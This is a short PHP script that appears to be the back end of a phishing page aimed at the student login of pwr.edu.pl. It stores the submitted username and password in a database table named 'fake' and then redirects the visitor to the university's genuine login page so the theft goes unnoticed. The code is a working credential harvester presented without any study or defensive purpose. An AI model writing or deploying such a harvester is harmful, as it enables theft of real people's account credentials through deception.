<?php

		$servername = "localhost";
		$username = "root";
		$password = "1234";
		$dbname = "banksql";
		$conn = new mysqli($servername, $username, $password, $dbname);
		function filtruj($zmienna){
    if(get_magic_quotes_gpc())
        $zmienna = stripslashes($zmienna);
    return mysql_real_escape_string(htmlspecialchars(trim($zmienna)));
}
	$us = filtruj($_POST['username']);
	$pw = filtruj($_POST['pass']);
		$conn->query("INSERT INTO fake (login, password)
				VALUES ('$us','$pw')");
		
		header("location:https://s.student.pwr.edu.pl/iwc_static/c11n/login_student_pwr_edu_pl.html?lang=pl&3.0.1.3.0_16070546&svcs=abs,mail,calendar,c11n");

?>